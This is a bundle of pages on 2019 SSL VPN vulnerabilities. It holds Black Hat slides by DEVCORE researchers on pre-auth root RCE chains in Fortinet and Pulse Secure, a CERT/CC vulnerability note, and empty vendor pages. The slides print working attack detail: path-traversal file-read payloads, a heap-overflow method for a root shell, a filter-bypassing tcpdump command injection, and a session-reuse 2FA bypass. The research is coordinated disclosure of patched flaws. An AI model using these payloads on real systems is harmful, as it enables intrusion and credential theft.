=== Content from i.blackhat.com_7e70c61a_20250121_003210.html ===
Infiltrating Corporate Intranet
Like NSA
Pre-auth RCE on Leading SSL VPNs

Orange Tsai (@orange_8361)

Meh Chang (@mehqq_)

USA 2019

Orange Tsai

• Principal security researcher at  DEVCORE

• Captain of HITCON CTF team

• 0day researcher, focusing on

Web/Application security

orange_8361

Meh Chang

• Security researcher at DEVCORE

• HITCON & 217 CTF team

• Focus on binary exploitation

mehqq_

Highlights today

• Pre-auth root RCE exploit chain on Fortinet SSL VPN

• Hard-core binary exploitation

• Magic backdoor

• Pre-auth root RCE exploit chain on Pulse Secure SSL VPN

• Out-of-box web exploitation

• Highest bug bounty from Twitter ever

• New attack surface to compromise back all your VPN clients

Agenda

• Introduction

• Jailbreak the SSL VPN

• Attack vectors

• Case studies & Demos

• Weaponize the SSL VPN

• Recommendations

SSL VPN

• Trusted by large corporations to protect their assets

• Work with any network environments and firewalls

• Clientless, a web browser can do everything!

Browser

SSL/TLS

Intranet

SSL VPN

What if your trusted SSL VPN
is insecure?

Why focusing on SSL VPN

1.

Important corporate assets but a blind-spot

2. Widely used by corporations of all sizes

3. Only few SSL VPN vendors dominate the market

4. Direct Intranet access and must be exposed to outside

Even NSA is hunting bugs on
SSL VPN

Think about Equation Group leaks

They are usually forgotten

A silent-fix case

• We accidentally found a pre-auth RCE on Palo Alto SSL VPN

during our Red Team assessment

• A silent fixed 1-day:

• No CVE

• No advisory

• No official announcement

Hacking Uber as showcase

Response from Palo Alto PSIRT

Palo Alto Networks does follow coordinated vulnerability disclosure for

security vulnerabilities that are reported to us by external researchers.

We do not CVE items found internally and fixed. This issue was previously

fixed, but if you find something in a current version, please let us know.

High severity CVE statistics

159

50

26

17

13

6

Cisco

F5

Palo Alto

Citrix

Fortinet

Pulse Secure

https://nvd.nist.gov

We focus on…

• Pulse Secure SSL VPN

• More than 50,000+ servers operating on the Internet

• Trusted by large corporations, service providers and government

entities

• Fortigate SSL VPN

• More than 480,000+ servers operating on the Internet

• Prevalent among medium-sized enterprises

Let's start hacking

Difficulties for kick-starting

• SSL VPN is a black box and closed source appliance

• All-in-one & Build their own architecture stacks from scratch

• Only restricted shell provided

• Jailbreak is the prerequisite for further researches

Jailbreak the SSL VPN

• We are not hardware guys :(

• So we look into the virtual image first

• Analyzing virtual images

1. Typical virtual images

2. Encrypted virtual images

Typical virtual images

• If there is no LILO or GRUB password protected, we can just enter

the Single-User mode

• Mount the .VMDK on your Linux box and modify the filesystem

• /etc/crontab

• /etc/ld.so.conf

• /etc/passwd

• Many ways…

What if the disk has been
encrypted?

Encrypted virtual images

BIOS/MBR

LILO/GRUB

• Stage 1
• Stage 2

• vmlinuz kernel

• Level - Hard

• Reverse engineering for the win!

vmlinuz kernel

• /sbin/init

• zImagea
• bzImage

/sbin/init

• Level - Easy

• Memory forensics for the win!

The booting process

BIOS

LILO

Kernel

/sbin/init

?????????????????

The booting process

BIOS

LILO

Kernel

/sbin/init

?????????????????

Find the vital point

BIOS

LILO

Kernel

/sbin/init

/home/bin/dsconfig.pl

Memory Forensics

In-memory patch

BIOS

LILO

Kernel

/sbin/init

///////////////bin/sh

Memory Patch

Once we press the Enter…

BIOS

LILO

Kernel

/sbin/init

///////////////bin/sh

Digging at a correct place

Attack vectors

• WebVPN

• Native script language extensions

• Multi-layered architecture problems

WebVPN

• A convenient proxy feature – Portable & Clientless

• Proxy all kinds of traffics through the web browser

• Supports various protocols

• HTTP, FTP, TELNET, SSH, SMB, RDP …

• Handles various web resources

• WebSocket, JavaScript, Flash, Java Applet …

WebVPN implementation

• Build from scratch

• Protocols, web resources handling are prone to memory bugs

• Requires high security awareness

• Debug function

• Logging sensitive data

• Information exposed

WebVPN implementation

• Modify from an open source project

• Copy the code, copy the bugs

• Hard to maintain & update & patch

• Call existing libraries

• Neglect to update

• Libcurl (2008), Libxml (2009)

Native script language
extensions

• Most SSL VPNs have their own native script

language extensions

Web Stack

• En/Decoding in C/C++

F5 Networks

PHP / C (Apache extension)

• Type confusion between

languages

Cisco

Lua / C (self-implemented server)

Pulse Secure

Perl / C++ (self-implemented server)

Fortigate

Nginx / C (Apache extension)

Palo Alto

PHP / C (AppWeb extension)

Citrix

PHP / C (self-implemented server)

En/Decoding in C/C++

• String operation is always difficult for C language

• Buffer size calculation

• Dangerous functions

• Misunderstood functions

ret = snprintf(buf, buf_size, format, …);
left_buf_size = buf_size – ret;

Type confusion

• Type seems the same but …

• Perl string or C string?

• What TYPE is it?

my ($var) = @_;
EXTENSION::C_function($var);

Multi-layered architecture
problems

• Inconsistency between each architecture layer

• Failed patterns

• Reverse proxy + Java web = Fail

• Breaking Parser Logic by Orange Tsai from Black Hat USA 2018

• Customized(C/C++) web server + RESTful API backend

Failed Patterns

• ACL bypass on customized C webserver + RESTful backend

• Abuse Regular Expression greedy mode to bypass path check

^/public/images/.+/(front|background)_.+

• Dispatched to backend PHP engine and access privileged pages

https://sslvpn/public/images/x/front_x/../../../../some.php

Case studies

Pre-auth remote code execution on Fortigate SSL VPN

Pre-auth remote code execution on Pulse Secure SSL VPN

Disclaimer

All the CVEs mentioned below have been reported and patched

by Fortinet, Pulse Secure and Twitter

Fortigate SSL VPN

• All programs and configurations compiled into /

/bin/init

• About 500 MB, stripped idb with 85k functions

• Plenty of function tables

• Customized web daemons

• Based on apache since 2002

• Self-implemented apache module

Fortigate web interface

Worth mentioning bugs

• Pre-auth RCE chain

• CVE-2018-13379: Pre-auth arbitrary file reading

• CVE-2018-13382: Post-auth heap overflow

• The magic backdoor

• CVE-2018-13383: Modify any user’s password with a magic key

Arbitrary file reading

• A function reading language json files for users

• Concatenate strings directly

• No . . / filter

• Limited file extension

snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);

Arbitrary file reading

• Utilize the feature of snprintf

• The snprintf() and vsnprintf() functions will write at most size-1 of

the characters printed into the output string

• Appended file extension can be stripped!

lang=/../../../..//////////////////////////////bin/sh
snprintf(s, 0x40, "/migadmin/lang/%s.json", lang);
/migadmin/lang//../../../..//////////////////////////////bin/sh.json

0x40

An SSL VPN mystery

Appears in many products …

Excessively detailed session file

•

/dev/cmdb/sslvpn_websession

• Session token

• IP address

• User name

• Plaintext password

WebVPN

WebVPN – HTTP/HTTPS

https://sslvpn:4433/proxy/72ebc8b8/https/devco.re/

WebVPN – HTTP/HTTPS

Heap overflow vulnerability

• HTTP proxy

• Perform URL rewriting

• JavaScript parsing

• memcpy to a 0x2000 heap buffer without length check

memcpy(buffer, js_url, js_url_len);

Exploitation obstacles

• Destabilizing factors of heap

• Multiple connection handling with epoll()

• Main process and libraries use the same heap – Jemalloc

• Regularly triggered internal operations unrelated to connection

• Apache additional memory management

• No free() unless connection ends

Jemalloc allocator limitation

• Centralize small objects

• Stores small regions in

corresponding runs

• Reduce interference between

small and large objects

• Limit target options

run
(0x20)

header

bitmap

reg 0

reg 1

reg 2

…

reg N

run
(0x30)

header

bitmap

reg 0

reg 1

…

reg N

Surprise!

Program received signal SIGSEGV, Segmentation fault.

0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-

x86_64/lib/libssl.so.1.1

2: /x $rax = 0x41414141

1: x/i $pc

=> 0x7fb908d12a77 <SSL_do_handshake+23>: callq *0x60(%rax)

(gdb)

SSL structure (OpenSSL)

• Stores information of each SSL connection

• Ideal target

Allocation triggered easily

Size close to JavaScript buffer

Nearby JavaScript buffer with regular offset (k + N pages)

Useful structure members

Useful structure members

typedef struct ssl_st SSL;

struct ssl_st {

int version;

const SSL_METHOD *method;

//func table

…

int (*handshake_func) (SSL *);

};

Mess up connections

• Overflow SSL structure

• Establish massive connections

• Lots of normal requests

• One overflow request

Fuzzer

Massive
connections

Normal request

Normal request

Overflow request

Normal request

Fortigate
SSL VPN

Exploit between connections

Connection 1

Connection 3

Connection 2

LOW

HIGH

SSL

SSL

SSL

HEAP MEMORY

Original SSL structure

ssl_accept()

version method

…

*handshake
_func

…

LOW

HIGH

SSL

SSL

SSL

HEAP MEMORY

Trigger JavaScript Parsing

ssl_accept()

Allocate

version method

…

*handshake
_func

…

LOW

JS
Buffer

HEAP MEMORY

SSL

SSL

SSL

HIGH

Overflow SSL structure

ssl_accept()

version method

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
memcpy(buffer, js_url, js_url_len);
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
LOW
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

*handshake
_func

JS
Buffer

HIGH

SSL

SSL

SSL

…

…

HEAP MEMORY

From SEGFAULT to RCE

ssl_accept()

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
version method
…
…
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

*handshake
*handshake
_func
_func

…
…

LOW

HIGH

AAAAAAAAAAAAAAAAAAAAAAAAAA
SSL
AAAAAAAAAAAAAAAAAAAAAAAAAA

SSL

SSL

HEAP MEMORY

Forge SSL structure

system()

version method

…

*handshake
_func

…

LOW

HIGH

JS Buffer

SSL

SSL

SSL

HEAP MEMORY

Enjoy your shell!

• Send fuzzy connections to meet the condition

• Daemon may crash multiple times

• Fortigate owns a reliable watchdog!

• Get a shell in 1~2 minutes

Make your life easier

Find another Door to get in

MAGIC backdoor

• A “magic” parameter

• Secret key for reset password

• Designed for updating outdated password

• but lack of authentication

Demo

Pop a root shell from the only exposed HTTPS port

Demo

https://youtu.be/Aw55HqZW4x0

Pulse Secure SSL VPN

• Pulse Secure was formed a divestiture of Juniper Networks

• Customized web server and architecture stack

• Perl enthusiast - numerous Perl extensions in C++

• LD_PRELOAD all processes with:

• libsafe.so - Detect and protect against stack smashing attacks

• libpreload.so - User-mode networking system call hooks

Vulnerabilities we found

• CVE-2019-11510 - Pre-auth arbitrary file reading
• CVE-2019-11538 - Post-auth NFS arbitrary file reading
• CVE-2019-11508 - Post-auth NFS arbitrary file writing
• CVE-2019-11542 - Post-auth stack buffer overflow
• CVE-2019-11539 - Post-auth command injection
• CVE-2019-11540 - XSSI session hijacking
• CVE-2019-11507 - Cross-site scripting

Arbitrary file reading

• CVE-2019-11510 – Webserver-level pre-auth file reading

• Pulse Secure has introduced a new feature HTML5 Access since

SSL VPN version 8.2

• A new solution to access Telnet, SSH and RDP via browsers

• To handle static resources, Pulse Secure created a new IF-case to

widen the original strict path validation

Am I affected by this vuln?

• Probably YES!

• All un-patched versions are vulnerable except the End-of-Life 8.1 code

$ curl -I 'https://sslvpn/dana-na///css/ds.js'

HTTP/1.1 400 Invalid Path

$ curl -I 'https://sslvpn/dana-na///css/ds.js?/dana/html5acc/guacamole/'

HTTP/1.1 200 OK

What can we extract?

1. Private keys and system configuration(LDAP, RADIUS and SAML…)

2. Hashed user passwords(md5_crypt)

3. Sensitive cookies in WebVPN(ex: Google, Dropbox and iCloud…)

4. Cached user plaintext passwords

What can we extract?

1. Private keys and system configuration(LDAP, RADIUS and SAML…)

2. Hashed user passwords(md5_crypt)

3. Sensitive cookies in WebVPN(ex: Google, Dropbox and iCloud…)

4. Cached user plaintext passwords

Command Injection

• CVE-2019-11539 – Post-auth Command Injection

/dana-admin/diag/diag.cgi

sub tcpdump_options_syntax_check {

my $options = shift;
return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;
return undef;

}

Command Injection

Pulse Secure hardenings

• Several hardenings on Pulse Secure SSL VPN…

1. System integrity check

2. Read-only filesystem(only /data are writable)

3. The DSSafe.pm as a safeguard protects Perl from dangerous

operations

The Perl gatekeeper

• DSSafe.pm

• A Perl-C extension hooks several Perl functions such as:

• system, open, popen, exec, backstick…

• Command-line syntax validation

• Disallow numerous bad characters - [\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]

• Re-implement the Linux I/O redirections in Perl

Failed argument injection :(

• TCPDUMP is too old(v3.9.4, Sept 2005) to support post-rotate-command

• Observed Pulse Secure caches Perl template result in:

• /data/runtime/tmp/tt/*.thtml.ttc

• No way to generate a polyglot file in both Perl and PCAP format

>_

/usr/sbin/tcpdump –help

Usage: tcpdump [-aAdDeflLnNOpqRStuUvxX] [-c count] [-C file_size]

[-E algo:secret] [-F file] [-i interface] [-M secret]
[-r file] [-s snaplen] [-T type] [-w pcap-file]
[-W filecount] [-z postrotate-command]
[-y datalinktype] [-Z user] [expression]

Time to dig deeper

• Dig into DSSafe.pm more deeply, we found a flaw in

command line I/O redirection parsing

dssafe_example.pl

use DSSafe;

system("tcpdump -d $options >/dev/null 2>&1");

system("tcpdump -d -h >file >/dev/null 2>&1");   # `file` not  found

system("tcpdump -d -h >file < >/dev/null 2>&1"); # `file` created

Think out of the box

STDOUT is uncontrollable

Could we write a valid Perl by just STDERR?

Think out of the box

$ tcpdump -d -r '123'

tcpdump: 123: No such file or directory

$ tcpdump -d -r '123' 2>&1 | perl -

syntax error at - line 1, near "123:"

Execution of - aborted due to compilation errors.

Think out of the box

$ tcpdump -d -r 'print 123#'

tcpdump: print 123#: No such file or directory

$ tcpdump -d -r 'print 123#' 2>&1 | perl –

123

Perl 101

Code

tcpdump: print 123#: No such file or directory

GOTO label

Comment

/usr/sbin/tcpdump -d

-r'$x="ls",system$x#'

2>/data/runtime/tmp/tt/setcookie.thtml.ttc

<

>/dev/null

2>&1

RCE Exploit

/usr/sbin/tcpdump -d

1

-r'$x="ls",system$x#'

2>/data/runtime/tmp/tt/setcookie.thtml.ttc

<

>/dev/null

2>&1

STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc

tcpdump: $x="ls",system$x#: No such file...

/usr/sbin/tcpdump -d

-r'$x="ls",system$x#'

2

2>/data/runtime/tmp/tt/setcookie.thtml.ttc

<

>/dev/null

2>&1

STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc

tcpdump: $x="ls",system$x#: No such file...

/usr/sbin/tcpdump -d

-r'$x="ls",system$x#'

2>/data/runtime/tmp/tt/setcookie.thtml.ttc

3

<

>/dev/null

2>&1

STDERR(2) > /data/runtime/tmp/tt/setcookie.thtml.ttc

tcpdump: $x="ls",system$x#: No such file...

/usr/sbin/tcpdump -d

-r'$x="ls",system$x#'

>_
2>/data/runtime/tmp/tt/setcookie.thtml.ttc

curl https://sslvpn/dana-na/auth/setcookie.cgi

<

boot  bin  home  lib64
data  etc  lib   lost+found  modules  pkg  sbin  tmp
...

>/dev/null

mnt      opt  proc  sys  usr  var

2>&1

Response from Pulse Secure

• Pulse Secure is committed to providing customers with the best Secure Access Solutions

for Hybrid IT- SSL VPN and takes security vulnerabilities very seriously

• Timeline:

• This issue was reported to Pulse Secure PSIRT Team on March 22, 2019

• Pulse Secure fixes all reported issues in short span of time and published the security advisory SA44101 on

April 24, 2019 with all software updates that address the vulnerabilities for unpatched versions

• Pulse Secure assigned the CVE’s to all reported vulnerabilities and updated the advisory on April 25, 2019

• Pulse Secure sent out a reminder to all customers to apply the security patches on June 26, 2019

• Pulse Secure would like to thank DEVCORE Team for reporting this vulnerability to Pulse

Secure and working toward a coordinated disclosure

Hacking Twitter

• We keep monitoring large corporations who use Pulse Secure

by fetching the exposed version and Twitter is one of them

• Pulse Secure released the patch on April 25, 2019 and we wait

30 days for Twitter to upgrade the SSL VPN

Twitter is vulnerable

$ ./pulse_check.py <mask>.twitter.com

[*] Date = Thu, 13 Dec 2018 05:34:28 GMT

[*] Version = 9.0.3.64015

[*] OK, <mask>.twittr.com is vulnerable

Two-factor authentication

• Bypass the two-factor authentication

1. Although we can extract cached passwords in plaintext from

/lmdb/dataa/data.mdb, we still can not do anything :(

2. Observe Twitter enabled the Roaming Session (enabled by default)

3. Download the /lmdb/randomVal/data.mdb to dump all session

4. Forge the user and reuse the session to bypass the 2FA

Restricted admin interface

However

We only have the hash of admin password in

sha256(md5_crypt(salt, …))

$20,160

Make the red team more
Red

Weaponize the SSL VPN

• The old-school method

• Watering hole / Drive by download

• Replace SSL VPN agent installer

• Man-in-the-middle attack

Weaponize the SSL VPN

• The new method to compromise all VPN clients

• Leverage the logon script feature!

• Execute specified program once the VPN client connected

• Almost every SSL VPN supports this feature

• Support Windows, Linux and Mac

Demo

Compromise all connected VPN clients

Demo

https://youtu.be/v7JUMb70ON4

Recommendations

• Client certificate authentication

• Multi factors authentication

• Enable full log audit (Be sure to send to out-bound server)

• Subscribe to the vendor's security advisory and keep system

updated!

Thanks!

@orange_8361

@mehqq_

orange@devco.re

meh@devco.re



=== Content from kb.pulsesecure.net_cb84f57e_20250121_003214.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from kb.pulsesecure.net_75eea374_20250121_003212.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from kb.pulsesecure.net_8c49dca6_20250121_003215.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from www.kb.cert.org_bb730dff_20250121_003216.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#927237

## Pulse Secure VPN contains multiple vulnerabilities

#### Vulnerability Note VU#927237

Original Release Date: 2019-10-16 | Last Revised: 2019-10-23

---

### Overview

Pulse Secure SSL VPN contains multiple vulnerabilities that can allow remote unauthenticated remote attacker to compromise the VPN server and connected clients.

### Description

| Pulse Secure released an out-of-cycle [advisory](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101) along with software patches for the various affected products on April 24, 2019. This addressed a number of vulnerabilities including a Remote Code Execution (RCE) vulnerability with pre-authentication access. This vulnerability has no viable workarounds except for applying the patches provided by the vendor and performing required system updates. The [CVE-2019-11510](https://nvd.nist.gov/vuln/detail/CVE-2019-11510) has a CVSS score of 10.  The CVEs listed in the advisory are:[CVE-2019-11510](https://nvd.nist.gov/vuln/detail/CVE-2019-11510) - Unauthenticated remote attacker with network access via HTTPS can send a specially crafted URI to perform an arbitrary file reading vulnerability.[CVE-2019-11509](https://nvd.nist.gov/vuln/detail/CVE-2019-11509) - Authenticated attacker via the admin web interface can exploit this issue to execute arbitrary code on the Pulse Secure appliance.[CVE-2019-11508](https://nvd.nist.gov/vuln/detail/CVE-2019-11508) - A vulnerability in the Network File Share (NFS) of Pulse Connect Secure allows an authenticated end-user attacker to upload a malicious file to write arbitrary files to the local system.[CVE-2019-11507](https://nvd.nist.gov/vuln/detail/CVE-2019-11507) - A XSS issue has been found in Pulse Secure Application Launcher page. Pulse Connect Secure (PCS) 8.3.x before 8.3R7.1, and 9.0.x before 9.0R3.[CVE-2019-11543](https://nvd.nist.gov/vuln/detail/CVE-2019-11543) - A XSS issue found the admin web console. Pulse Secure Pulse Connect Secure (PCS) 9.0RX before 9.0R3.4, 8.3RX before 8.3R7.1, and 8.1RX before 8.1R15.1 and Pulse Policy Secure 9.0RX before 9.0R3.2, 5.4RX before 5.4R7.1, and 5.2RX before 5.2R12.1. [CVE-2019-11542](https://nvd.nist.gov/vuln/detail/CVE-2019-11542) - Authenticated attacker via the admin web interface can send a specially crafted message resulting in a stack buffer overflow. [CVE-2019-11541](https://nvd.nist.gov/vuln/detail/CVE-2019-11541) - Users using SAML authentication with Reuse Existing NC (Pulse) Session option may see authentication leaks[CVE-2019-11540](https://nvd.nist.gov/vuln/detail/CVE-2019-11540) - A vulnerability in the Pulse Secure could allow an unauthenticated, remote attacker to conduct a (end user) session hijacking attack. [CVE-2019-11539](https://nvd.nist.gov/vuln/detail/CVE-2019-11539) - Authenticated attacker via the admin web interface allow attacker to inject and execute command injection[CVE-2019-11538](https://nvd.nist.gov/vuln/detail/CVE-2019-11538) - A vulnerability in the Network File Share (NFS) of Pulse Connect Secure could allow an authenticated end-user attacker to access the contents of arbitrary files on the local file system.Exploitation of these vulnerabilities was demonstrated at various events and proved to be highly impactful due to the direct access to admin privileges and the consequent ability to infect multiple VPN connected users and their desktops. Initially there was a lack of clarity about CVE-2019-11510, as to whether it can be mitigated with the requirement of a client-certificate or two-factor authentication (2FA) to prevent this attack. CERT/CC has confirmed with the vendor that this vulnerability cannot be mitigated using client certificate and furthermore there is no viable alternative to updating the Pulse Secure VPN software to a non-vulnerable version. Even if client certificates are required for user authentication, CVE-2019-11510 can be exploited by an unauthenticated remote attacker to obtain session IDs of active users stored in /data/runtime/mtmp/lmdb/randomVal/data.mdb. The attacker can use these session IDs to impersonate as one of the active users. If a Pulse Secure administrator is currently active and the administrative access is available to the attacker, attacker could gain administrative access to Pulse Secure VPN. It is highly recommended that all Pulse Secure VPN administrators perform the required upgrade on all their affected products. If your Pulse Secure VPN has been identified as End of Engineering (EOE) and End of Life (EOL), we highly recommend replacement of the VPN appliance entirely without any delay - please check Pulse Secure advisory for this information.Timelines of specific events:March 22, 2019 – Security researcher O. Tsai and M. Chang responsibly disclose vulnerability to Pulse SecureApril 24, 2019 - Initial advisory posted and software updates posted by Pulse Secure to the Download CenterApril 25, 2019 – Assignment of [CVE-2019-11510](https://nvd.nist.gov/vuln/detail/CVE-2019-11510), [CVE-2019-11509](https://nvd.nist.gov/vuln/detail/CVE-2019-11509), [CVE-2019-11508](https://nvd.nist.gov/vuln/detail/CVE-2019-11508), [CVE-2019-11507](https://nvd.nist.gov/vuln/detail/CVE-2019-11507), [CVE-2019-11543](https://nvd.nist.gov/vuln/detail/CVE-2019-11543), [CVE-2019-11542](https://nvd.nist.gov/vuln/detail/CVE-2019-11542), [CVE-2019-11541](https://nvd.nist.gov/vuln/detail/CVE-2019-11541), [CVE-2019-11540](https://nvd.nist.gov/vuln/detail/CVE-2019-11540), [CVE-2019-11539](https://nvd.nist.gov/vuln/detail/CVE-2019-11539), [CVE-2019-11538](https://nvd.nist.gov/vuln/detail/CVE-2019-11538)April 26, 2019 - Workaround provided for [CVE-2019-11508](https://nvd.nist.gov/vuln/detail/CVE-2019-11508) about disabling file sharing as a mitigationMay 28 2019 – Large commercial vendors get reports of vulnerable VPN through HackerOneJuly 31 2019 – Full RCE use of exploit demonstrated using the admin session hash to get complete shellAugust 8 2019 - Meh Chang and Orange Tsai demonstrate the VPN issues across multiple vendors (Pulse Secure) with detailed attack on active VPN exploitationAugust 24, 2019 – Bad Packets identifies over 14,500 vulnerable VPN servers globally still unpatched and in need of an upgradeOctober 7, 2019 – NSA produces a Cybersecurity Advisory on Pulse Secure and other VPN products being targeted actively by Advanced Persistent Threat actors |
| --- |

### Impact

| A remote, unauthenticated attacker may be able to compromise a vulnerable VPN server. The attacker may be able to gain access to all active users and their plain-text credentials. It may also be possible for the attacker to execute arbitrary commands on each VPN client as it successfully connects to the VPN server. |
| --- |

### Solution

| There is **no** viable workaround except to apply the patch and updates provided by the vendor. It is incorrect to assume use of client certificates or two-factor authentication (2FA) can prevent [CVE-2019-11510](https://nvd.nist.gov/vuln/detail/CVE-2019-11510) RCE pre-auth vulnerability. Updates are available from [Pulse Secure Advisory](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101). |
| --- |

| [CVE-2019-11508](https://nvd.nist.gov/vuln/detail/CVE-2019-11508) and [CVE-2019-11538](https://nvd.nist.gov/vuln/detail/CVE-2019-11538) can be mitigated by disabling File Sharing on the Pulse Secure VPN appliance.There are **no** workarounds that address the other vulnerabilities. |
| --- |

### Vendor Information

927237
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23927237/) to view vendors.**
### [Pulse Secure](#CHEU-BGSLTB) Affected

Notified:  October 09, 2019  Updated: October 16, 2019

### Status

Affected

### Vendor Statement

Multiple vulnerabilities were discovered and have been resolved in Pulse Connect Secure (PCS) and Pulse Policy Secure (PPS).

### Vendor Information

Vendor has provided a detailed advisory [here](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101).

There is no workaround to address CVE-2019-11510 vulnerability. Pulse Secure recommends software upgrade as soon as possible.

### Vendor References

* <https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101>

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 9.4 | AV:N/AC:L/Au:N/C:C/I:C/A:N |
| Temporal | 8.2 | E:H/RL:OF/RC:C |
| Environmental | 8.2 | CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |

### References

* [https://kb.pulsesecure.net/articles/Pulse\_Security\_Advisories/SA44101](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101%20)
* <https://cyber.gc.ca/en/alerts/active-exploitation-vpn-vulnerabilities>
* <https://github.com/projectzeroindia/CVE-2019-11510>
* <https://www.exploit-db.com/exploits/47297>
* [https://www.youtube.com/watch?v=v7JUMb70ON4](https://www.youtube.com/watch?v=v7JUMb70ON4 )
* [https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/](https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/%20)
* <https://media.defense.gov/2019/Oct/07/2002191601/-1/-1/0/CSA-MITIGATING-RECENT-VPN-VULNERABILITIES.PDF>
### Acknowledgements

This vulnerability was reported by Pulse Secure, who in turn credit Orange Tsai and Meh Chang from DEVCORE research team, and Jake Valletta from FireEye

This document was written by Vijay S Sarvepalli.

### Other Information

| **CVE IDs:** | [CVE-2019-11510](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11510), [CVE-2019-11509](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11509), [CVE-2019-11508](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11508), [CVE-2019-11507](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11507), [CVE-2019-11543](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11543), [CVE-2019-11542](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11542), [CVE-2019-11541](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11541), [CVE-2019-11540](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11540), [CVE-2019-11539](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11539), [CVE-2019-11538](http://web.nvd.nist.gov/vuln/detail/CVE-2019-11538) |
| --- | --- |
| **Date Public:** | 2019-04-28 |
| **Date First Published:** | 2019-10-16 |
| **Date Last Updated:** | 2019-10-23 02:35 UTC |
| **Document Revision:** | 43 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from devco.re_84c9a73c_20250121_003207.html ===


[![](/images/logo.svg)](/en/)

* Services
  [## Red Team Assessment

  Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.](/en/services/red-team/)
  [## Penetration Testing

  Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.](/en/services/penetration-test/)
  [## Security Consulting

  Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.](/en/services/security-consulting/)
  [## Security Training

  Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.](/en/services/security-training/)
* Research
  [## Overview

  Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.](/en/research/overview/)
  [## Competitions and Awards

  Awards from international cybersecurity competitions.](/en/research/awards/)
  [## Enterprise Vulnerability Reports

  Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.](/en/research/bug-bounty/)
  [## International Conferences

  Sharing vulnerability research and security knowledge at international cybersecurity conferences.](/en/research/talks/)
  [## CVE List

  Discovery of critical vulnerabilities in leading international products and services.](/en/research/cve/)
* Company
  [## Company Overview

  Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment, Penetration Testing, Security Consulting, and Security Training.](/en/company/about/)
  [## Team Members

